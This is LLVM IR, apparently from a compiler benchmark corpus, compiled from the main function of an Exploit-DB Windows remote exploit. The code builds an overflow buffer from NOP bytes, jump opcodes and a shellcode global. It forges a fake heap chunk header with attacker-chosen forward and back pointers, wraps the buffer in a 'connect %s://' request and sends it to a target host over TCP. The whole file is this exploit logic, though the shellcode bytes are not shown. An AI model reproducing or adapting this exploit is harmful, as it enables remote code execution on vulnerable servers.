; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20559.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20559.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.malloc_chunk = type { i32, i32, %struct.malloc_chunk*, %struct.malloc_chunk* }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@c0de = common dso_local global i8* null, align 8
@jmps = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [20 x i8] c"strlen magic is %i\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"connect %s://\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"shooting\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [5 x i32], align 16
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.malloc_chunk, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 5
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 (...) @usage()
  br label %20

20:                                               ; preds = %18, %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 3
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  %25 = add nsw i32 %24, 1
  %26 = call i64 @malloc(i32 %25)
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** %12, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 3
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  %32 = add nsw i32 %31, 30
  %33 = call i64 @malloc(i32 %32)
  %34 = inttoptr i64 %33 to i8*
  store i8* %34, i8** %13, align 8
  %35 = load i8*, i8** %12, align 8
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38)
  %40 = call i32 @memset(i8* %35, i8 signext -112, i32 %39)
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 6
  %43 = load i8*, i8** %42, align 8
  %44 = call i64 @strtol(i8* %43, i32* null, i32 16)
  store i64 %44, i64* %15, align 8
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 5
  %47 = load i8*, i8** %46, align 8
  %48 = call i64 @strtol(i8* %47, i32* null, i32 16)
  store i64 %48, i64* %14, align 8
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @inet_addr(i8* %51)
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 0
  store i32 %52, i32* %54, align 4
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  %59 = call i32 @htons(i32 %58)
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %59, i32* %60, align 4
  %61 = load i32, i32* @AF_INET, align 4
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %61, i32* %62, align 4
  %63 = getelementptr inbounds %struct.malloc_chunk, %struct.malloc_chunk* %11, i32 0, i32 0
  store i32 -2, i32* %63, align 8
  %64 = getelementptr inbounds %struct.malloc_chunk, %struct.malloc_chunk* %11, i32 0, i32 1
  store i32 -1, i32* %64, align 4
  %65 = load i64, i64* %15, align 8
  %66 = inttoptr i64 %65 to %struct.malloc_chunk*
  %67 = getelementptr inbounds %struct.malloc_chunk, %struct.malloc_chunk* %11, i32 0, i32 2
  store %struct.malloc_chunk* %66, %struct.malloc_chunk** %67, align 8
  %68 = load i64, i64* %14, align 8
  %69 = sub i64 %68, 8
  %70 = inttoptr i64 %69 to %struct.malloc_chunk*
  %71 = getelementptr inbounds %struct.malloc_chunk, %struct.malloc_chunk* %11, i32 0, i32 3
  store %struct.malloc_chunk* %70, %struct.malloc_chunk** %71, align 8
  %72 = load i32, i32* @AF_INET, align 4
  %73 = load i32, i32* @SOCK_STREAM, align 4
  %74 = call i32 @socket(i32 %72, i32 %73, i32 0)
  store i32 %74, i32* %6, align 4
  %75 = load i32, i32* %6, align 4
  %76 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %77 = call i32 @connect(i32 %75, %struct.sockaddr* %76, i32 12)
  %78 = load i8*, i8** %12, align 8
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 4
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @atoi(i8* %81)
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %78, i64 %83
  %85 = call i32 (i8*, ...) @memcpy(i8* %84, %struct.malloc_chunk* %11, i64 24)
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 3
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @atoi(i8* %88)
  %90 = sdiv i32 %89, 2
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 4
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93)
  %95 = icmp slt i32 %90, %94
  br i1 %95, label %96, label %119

96:                                               ; preds = %20
  store i32 0, i32* %7, align 4
  br label %97

97:                                               ; preds = %115, %96
  %98 = load i32, i32* %7, align 4
  %99 = load i8**, i8*** %5, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 4
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101)
  %103 = load i8*, i8** @c0de, align 8
  %104 = call i32 @strlen(i8* %103)
  %105 = sub nsw i32 %102, %104
  %106 = sub nsw i32 %105, 10
  %107 = icmp slt i32 %98, %106
  br i1 %107, label %108, label %118

108:                                              ; preds = %97
  %109 = load i8*, i8** %12, align 8
  %110 = load i32, i32* %7, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = load i8*, i8** @jmps, align 8
  %114 = call i32 (i8*, ...) @memcpy(i8* %112, i8* %113, i32 2)
  br label %115

115:                                              ; preds = %108
  %116 = load i32, i32* %7, align 4
  %117 = add nsw i32 %116, 2
  store i32 %117, i32* %7, align 4
  br label %97

118:                                              ; preds = %97
  br label %149

119:                                              ; preds = %20
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 4
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122)
  %124 = sext i32 %123 to i64
  %125 = add i64 %124, 24
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %7, align 4
  br label %127

127:                                              ; preds = %145, %119
  %128 = load i32, i32* %7, align 4
  %129 = load i8**, i8*** %5, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 3
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @atoi(i8* %131)
  %133 = sub nsw i32 %132, 10
  %134 = load i8*, i8** @c0de, align 8
  %135 = call i32 @strlen(i8* %134)
  %136 = sub nsw i32 %133, %135
  %137 = icmp slt i32 %128, %136
  br i1 %137, label %138, label %148

138:                                              ; preds = %127
  %139 = load i8*, i8** %12, align 8
  %140 = load i32, i32* %7, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %139, i64 %141
  %143 = load i8*, i8** @jmps, align 8
  %144 = call i32 (i8*, ...) @memcpy(i8* %142, i8* %143, i32 2)
  br label %145

145:                                              ; preds = %138
  %146 = load i32, i32* %7, align 4
  %147 = add nsw i32 %146, 2
  store i32 %147, i32* %7, align 4
  br label %127

148:                                              ; preds = %127
  br label %149

149:                                              ; preds = %148, %118
  %150 = load i8*, i8** %12, align 8
  %151 = load i32, i32* %7, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  %154 = load i8*, i8** @c0de, align 8
  %155 = load i8*, i8** @c0de, align 8
  %156 = call i32 @strlen(i8* %155)
  %157 = call i32 (i8*, ...) @memcpy(i8* %153, i8* %154, i32 %156)
  %158 = load i8*, i8** %12, align 8
  %159 = load i8**, i8*** %5, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 3
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 @atoi(i8* %161)
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8, i8* %158, i64 %163
  store i8 0, i8* %164, align 1
  %165 = load i8*, i8** %12, align 8
  %166 = call i32 @strlen(i8* %165)
  %167 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %166)
  %168 = load i8*, i8** %13, align 8
  %169 = load i8*, i8** %13, align 8
  %170 = load i8**, i8*** %5, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 3
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 @atoi(i8* %172)
  %174 = add nsw i32 %173, 20
  %175 = load i8*, i8** %12, align 8
  %176 = call i64 @snprintf(i8* %169, i32 %174, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %175)
  %177 = getelementptr inbounds i8, i8* %168, i64 %176
  store i8 0, i8* %177, align 1
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %179 = load i32, i32* %6, align 4
  %180 = load i8*, i8** %13, align 8
  %181 = load i8*, i8** %13, align 8
  %182 = call i32 @strlen(i8* %181)
  %183 = call i32 @send(i32 %179, i8* %180, i32 %182, i32 0)
  store i32 %183, i32* %8, align 4
  %184 = load i32, i32* %3, align 4
  ret i32 %184
}

declare dso_local i32 @usage(...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i64 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memcpy(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
